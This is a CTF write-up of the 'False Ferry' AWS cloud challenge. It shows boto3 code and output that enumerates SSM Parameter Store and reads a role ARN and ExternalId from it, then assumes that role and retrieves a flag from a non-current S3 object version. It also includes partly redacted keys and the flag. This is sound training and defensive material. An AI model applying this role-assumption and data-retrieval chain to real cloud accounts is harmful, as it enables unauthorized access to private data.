---
layout: post
title: "False Ferry"
date: 2026-07-27 00:00:00 -0700
categories: ctfs
description: A read-only AWS IAM user catalogs an SSM Parameter Store prefix, finds one parameter naming a role ARN, a matching ExternalId, and an exact non-current S3 object VersionId, assumes the role, and pulls the flag from a version of the object that predates it being overwritten.
parent: HackTheBox - Apocalypse '26
grand_parent: CTF Events
event: "hackthebox-apocalypse"
tags:
  - "cloud"
  - "aws"
  - "iam"
  - "s3"
  - "ssm"
  - "cyberapocalypse"
  - "T1548.005"
  - "T1530"
  - "T1619"
---

## Engagement Notes

`false-ferry` is a cloud-category challenge from Cyberapocalypse 2026. The framing:

> Lysa Harrowmere reaches the lower city ferry piers while Stormbound soldiers wait
> for the morning boat. They are supposed to cross the river and guard the east road
> before Vaultrune's next patrol moves through. The route board says the boat goes to
> the east road landing, but the crew roster sends it to a dock controlled by
> Vaultrune. If Lysa warns the soldiers openly, Vaultrune's men can claim she started
> a fight at the pier. If she confronts the ferry master, his guards can tear down the
> roster and post the correct one. Lysa has one job: find the earlier crossing list,
> prove who changed the dock, and get the soldiers onto the right boat before
> Vaultrune cuts the road.

And the task text underneath the narrative:

> You hold Stormbound Coalition ferry clerk access. Crossing batch metadata lives in
> Systems Manager under `/ferry/crossing/`. Catalog the namespace before you read any
> parameter value.

Translated out of the fiction: a low-privilege AWS IAM user, a pointer to an SSM
Parameter Store prefix, and "find the earlier crossing list" as a hint that S3 object
versioning is going to matter.

## Attack path

1. Authenticate as the handed-out `coalition-ferry-clerk` IAM user against a
   challenge-specific endpoint and confirm identity with `sts.get_caller_identity()`.
2. Run a full-service permission sweep with a bundled `aws-enumerator` binary —
   comes back empty everywhere except `STS`.
3. Follow the brief literally: `ssm.describe_parameters()` catalogs the
   `/ferry/crossing/` namespace (8 parameters) before any value is read.
4. `ssm.get_parameter()` on all 8. One, `CROSSING-7A3F`, is issued by the coalition
   itself (not the "third-party-archive" that stamps the others) and carries a role
   ARN, a matching `ExternalId`, a bucket, an object key, and an exact S3 VersionId.
5. `sts.assume_role()` into `ferry-crossing-scanner` using the `ExternalId` from the
   same parameter.
6. `s3.list_object_versions()` on the named bucket/prefix shows three versions of the
   manifest object.
7. `s3.get_object()` on a non-current VersionId returns an unrelated draft record —
   not the target.
8. `s3.get_object()` on the VersionId the SSM parameter explicitly named returns the
   flag.

## Starting access and a permission sweep that comes back empty

The starting point is a long-term IAM access key for `coalition-ferry-clerk`, pointed
at a challenge-specific endpoint:

```python
user = "coalition-ferry-clerk"
access_key = "AKIAI5T4…FYQG"
secret_key = "VtQLZ4qv…18fq"
region = "us-east-1"
endpoint = "http://154.57.164.75:32633/"
```

```python
sts = boto3.client('sts', aws_access_key_id=access_key, aws_secret_access_key=secret_key, region_name=region, endpoint_url=endpoint)
identity = sts.get_caller_identity()
print(identity)
```

```
{'UserId': 'AIDAEKHDR1PXTY0PZ4GV', 'Account': '584729103648', 'Arn': 'arn:aws:iam::584729103648:user/coalition-ferry-clerk', ...}
```

A `sts.get_session_token()` call was also made at this point, returning valid
temporary credentials for the same user — it wasn't chained into anything further.

Before hand-picking SSM calls, a bundled `aws-enumerator` binary sweeps every AWS
service it knows against these credentials:

```
AWS_DEFAULT_REGION="us-east-1" AWS_ENDPOINT_URL=http://154.57.164.75:32633 ./aws-enumerator enum
Message:  Successful ACM: 0 / 1
Message:  Successful APPMESH: 0 / 1
Message:  Successful APPSYNC: 0 / 1
[... 90 more services elided, every one 0 / N ...]
Message:  Successful SSM: 0 / 16
Message:  Successful STS: 2 / 2 # These are the getcalleridentity and sts-session-token functions
Message:  Successful TRANSFER: 0 / 1
[... remaining services elided, all 0 / N ...]
Time: 1m3.03285998s
Message:  Enumeration finished
```

> 🧠 Even the tool's own generic `SSM: 0 / 16` probes failed — this identity's real
> SSM access only worked once the exact `/ferry/crossing/` prefix from the brief was
> queried directly. Broad automated permission sweeps like this tended not to be
> useful on this style of challenge, since the permissions handed to the starting
> identity were scoped tightly enough that a blind, generic probe couldn't surface
> them; the way in here was the brief's explicit pointer, not the sweep's output.

## Cataloging the SSM namespace

Following the brief's "catalog the namespace before you read any parameter value",
the namespace is listed before any value is read:

```python
ssm = boto3.client('ssm', aws_access_key_id=access_key, aws_secret_access_key=secret_key, region_name=region, endpoint_url=endpoint)
parameters = ssm.describe_parameters()
pprint(parameters)
```

```
{'Parameters': [{'Name': '/ferry/crossing/live-crossing-id', 'Version': 1, ...},
                {'Name': '/ferry/crossing/CROSSING-VOID-9B11', 'Version': 1, ...},
                {'Name': '/ferry/crossing/CROSSING-CLOSED-5E22', 'Version': 1, ...},
                {'Name': '/ferry/crossing/CROSSING-DRAFT-8D40', 'Version': 1, ...},
                {'Name': '/ferry/crossing/CROSSING-VOID-3C21', 'Version': 1, ...},
                {'Name': '/ferry/crossing/CROSSING-7A3F', 'Version': 1, ...},
                {'Name': '/ferry/crossing/CROSSING-VOID-1A04', 'Version': 1, ...},
                {'Name': '/ferry/crossing/CROSSING-VOID-2D77', 'Version': 1, ...}]}
```

Every value is then pulled with `ssm.get_parameter()`. `/ferry/crossing/live-crossing-id`
is just a pointer — its value is the string `CROSSING-7A3F`, naming which of the other
seven records is currently "live". Four `CROSSING-VOID-*` records and one
`CROSSING-CLOSED-*`/`CROSSING-DRAFT-*` pair are all JSON blobs stamped
`"issuer": "third-party-archive"`, each with its own `scanner_external_id` and a
different `manifest_object_key`. One of them, `CROSSING-VOID-9B11`, stood out further:

```json
{
  "crossing_id": "CROSSING-VOID-9B11",
  "status": "VOID",
  "issuer": "third-party-archive",
  "scanner_external_id": "sb-ferry-audit-2025-11004-retired",
  "manifest_bucket": "ferry-crossing-manifest",
  "manifest_object_key": "manifests/emergency-crossing-draft.txt",
  "record_type": "crossing_manifest",
  "manifest_version_id": "00000000000000000000000000000000"
}
```

The `manifest_version_id` here is an all-zero placeholder that doesn't correspond to
anything real. The remaining `third-party-archive` records follow the same shape —
different `crossing_id`, different `manifest_object_key`, no live pointer naming them.

The one that matters is `CROSSING-7A3F`, matching the live pointer and issued by the
coalition itself rather than the third-party archive:

```json
{
  "crossing_id": "CROSSING-7A3F",
  "status": "AUTHORIZED",
  "issuer": "stormbound-coalition-ferry-office",
  "scanner_role_arn": "arn:aws:iam::584729103648:role/ferry-crossing-scanner",
  "scanner_external_id": "ferry-crossing-scanner-7a3f",
  "manifest_bucket": "ferry-crossing-manifest",
  "manifest_object_key": "manifests/morning-crossing-order.txt",
  "manifest_version_id": "c1d94380-11b6-47c9-992b-457a4a6f5f1c",
  "record_type": "crossing_manifest"
}
```

This single parameter hands over everything needed for the next stage: a role ARN,
the `ExternalId` its trust policy requires, the bucket, the object key, and the exact
S3 VersionId to retrieve. A markdown note written at this point in the engagement
records the reasoning:

> 3 interesting ones:
>     arn:aws:ssm:us-east-1:584729103648:parameter/ferry/crossing/live-crossing-id
>     (because it's live)
>     arn:aws:ssm:us-east-1:584729103648:parameter/ferry/crossing/CROSSING-VOID-9B11
>     (because manifest_version_id is named 00000\*)
>     arn:aws:ssm:us-east-1:584729103648:parameter/ferry/crossing/CROSSING-7A3F
>     (because it's "authorized)
>
> 3rd one also has another role: '"arn:aws:iam::584729103648:role/ferry-crossing-scanner",\n'

> 🧠 The other five `third-party-archive` records were ruled out from reading their
> JSON content alone — no S3 calls were made against any of their listed object keys
> or the all-zero VersionId on `CROSSING-VOID-9B11`. Once `CROSSING-7A3F` pointed at a
> concrete bucket, key, and VersionId, the rest weren't pursued further.

## Assuming `ferry-crossing-scanner`

With the role ARN and matching `ExternalId` in hand, `sts.assume_role()` is called
directly against the clerk user's credentials:

```python
scanner_assume = boto3.client('sts', aws_access_key_id=access_key, aws_secret_access_key=secret_key, region_name=region, endpoint_url=endpoint)
scanner = scanner_assume.assume_role(RoleArn='arn:aws:iam::584729103648:role/ferry-crossing-scanner', RoleSessionName='debug', ExternalId='ferry-crossing-scanner-7a3f')
print(scanner)
```

```
{'Credentials': {'AccessKeyId': 'ASIAH5OH…3R87', 'SecretAccessKey': 'yx5OojA6…TeaR', 'SessionToken': 'puGIHVXU…53U3', ...},
 'AssumedRoleUser': {'AssumedRoleId': 'AROAG8QZCQ836ANN2EDT:debug',
  'Arn': 'arn:aws:sts::584729103648:assumed-role/ferry-crossing-scanner/debug'}, ...}
```

Confirmed with a second `get_caller_identity()` under the new session:

```
{'UserId': 'AROAG8QZCQ836ANN2EDT:debug', 'Account': '584729103648', 'Arn': 'arn:aws:sts::584729103648:assumed-role/ferry-crossing-scanner/debug', ...}
```

> 🧠 The `ExternalId` a role's trust policy requires is a legitimate mechanism — an
> additional shared identifier, commonly used for vendor-style cross-account resource
> sharing, where it helps prevent a confused-deputy assumption of the role by a third
> party who doesn't know the value. Here it happened to add no practical barrier
> specifically because the same principal that needed it (`coalition-ferry-clerk`)
> could already read it from the same SSM parameter that named the role — a
> challenge-specific weakness in how the value was scoped, not a general weakness in
> the mechanism.

## Version history and the flag

The assumed role can reach the bucket named in the parameter. Rather than a plain
`get_object`, the notebook lists every version of everything under the `manifests`
prefix:

```python
scanner_s3 = boto3.client('s3', aws_access_key_id=scanner_access_key, aws_secret_access_key=scanner_secret_key, aws_session_token=scanner_session_token, region_name=region, endpoint_url=endpoint)
crossing_order = scanner_s3.list_object_versions(Bucket='ferry-crossing-manifest', Prefix='manifests')
pprint(crossing_order)
```

```
{'Name': 'ferry-crossing-manifest',
 'Prefix': 'manifests',
 'Versions': [{'ETag': '"9568150b6166dad6937c9d878f9a0481"',
               'IsLatest': True,
               'Key': 'manifests/morning-crossing-order.txt',
               'LastModified': datetime.datetime(2026, 7, 27, 3, 2, 12, tzinfo=tzutc()),
               'Size': 129,
               'VersionId': 'cb786ab5-acbe-4df8-9023-eae7ddfb9e9e'},
              {'ETag': '"eace9fa6bc64353a0e4e8b4198152d2e"',
               'IsLatest': False,
               'Key': 'manifests/morning-crossing-order.txt',
               'LastModified': datetime.datetime(2026, 7, 27, 3, 2, 12, tzinfo=tzutc()),
               'Size': 99,
               'VersionId': '7e068b41-2e11-477c-b636-044ff53f782c'},
              {'ETag': '"1189847d3b74f846c69cc4d69de26800"',
               'IsLatest': False,
               'Key': 'manifests/morning-crossing-order.txt',
               'LastModified': datetime.datetime(2026, 7, 27, 3, 2, 12, tzinfo=tzutc()),
               'Size': 157,
               'VersionId': 'c1d94380-11b6-47c9-992b-457a4a6f5f1c'}]}
```

The bucket has versioning enabled, and `manifests/morning-crossing-order.txt` has
three recorded versions. The current (`IsLatest: True`) version, `cb786ab5…`, is never
fetched anywhere in the notebook.

> 🧠 Skipping the current version was deliberate, not an oversight — the SSM
> parameter already named the exact non-current VersionId to pull. What mattered
> for picking between the two non-current versions was actually the timestamps, not
> re-checking the object AWS currently considers "latest".

First, the other non-current version, `7e068b41`:

```python
manifest2 = scanner_s3.get_object(Bucket='ferry-crossing-manifest', Key='manifests/morning-crossing-order.txt', VersionId='7e068b41-2e11-477c-b636-044ff53f782c')
pprint(manifest2["Body"].read())
```

```
(b'CROSSING RELEASE - PENDING APPROVAL\nBatch: CROSSING-DRAFT-8D40\nStatus: A'
 b'WAITING_CROSSING_SIGNATURE\n')
```

That's an older draft record, not the target — no flag here. Then the VersionId the
`CROSSING-7A3F` parameter explicitly named, `c1d94380`:

```python
manifest3 = scanner_s3.get_object(Bucket='ferry-crossing-manifest', Key='manifests/morning-crossing-order.txt', VersionId='c1d94380-11b6-47c9-992b-457a4a6f5f1c')
pprint(manifest3["Body"].read())
```

```
(b'CROSSING RELEASE RECORD\nBatch: CROSSING-7A3F\nAuthorized by: Stormbound C'
 b'oalition Ferry Office\nHTB{ferry_crossing_dock_seal_f439040c863aed0e9e9a2'
 b'd5d48387d27}\n')
```

```
HTB{ferry_crossing_dock_seal_f439040c863aed0e9e9a2d5d48387d27}
```

## Tools used

| Tool | Role on this box | Reference |
|---|---|---|
| `aws-enumerator` | Full-service permission sweep against the starting credentials — came back empty except STS | [shabarkin/aws-enumerator](https://github.com/shabarkin/aws-enumerator) |
| `boto3` | AWS SDK used for every API call in the chain (STS, SSM, S3) | [boto3 documentation](https://boto3.amazonaws.com/v1/documentation/api/latest/index.html) |

## Tactics (MITRE ATT&CK)

- **[T1548.005 — Abuse Elevation Control Mechanism: Temporary Elevated Cloud
  Access](https://attack.mitre.org/techniques/T1548/005/)**: `sts:AssumeRole` with an
  `ExternalId` recovered from a readable SSM parameter gains temporary elevated
  credentials for the `ferry-crossing-scanner` role.
- **[T1530 — Data from Cloud Storage](https://attack.mitre.org/techniques/T1530/)**:
  the flag and the earlier draft record are both retrieved directly from S3 via
  `s3:GetObject`.
- **[T1619 — Cloud Storage Object Discovery](https://attack.mitre.org/techniques/T1619/)**:
  `s3:ListObjectVersions` enumerates the version history of the manifest object to
  find the non-current versions, one of which holds the flag.

**Not tagged, and why:**
- *T1552.005 (Unsecured Credentials: Cloud Instance Metadata API)* — considered
  because the leaked role ARN and `ExternalId` come from a cloud-native store, but the
  [technique definition](https://attack.mitre.org/techniques/T1552/005/) scopes this
  sub-technique to the EC2/cloud instance metadata service and adjacent config
  sources (CodeBuild environment variables, CloudFormation templates) — not SSM
  Parameter Store values read via `ssm:GetParameter`. No sub-technique under T1552
  covers Parameter Store specifically.
- *T1580 (Cloud Infrastructure Discovery)* — considered for the `aws-enumerator`
  full-service sweep, but the [technique
  definition](https://attack.mitre.org/techniques/T1580/) centers on discovering
  existing infrastructure components (instances, buckets, snapshots) accessible to a
  credential. The sweep's `0 / N` output per service is testing which API calls
  succeed at all — permission mapping, not resource discovery.

## Further reading

**Used during the engagement:**
- [aws-enumerator](https://github.com/shabarkin/aws-enumerator) — full-service AWS
  permission sweep run against the starting credentials.

---

*Provenance: commands, outputs, credentials, and flags are transcribed from the
engagement notebook (credential material partially redacted). External facts (MITRE
technique definitions) are linked to their source and were fetched, not recalled.*
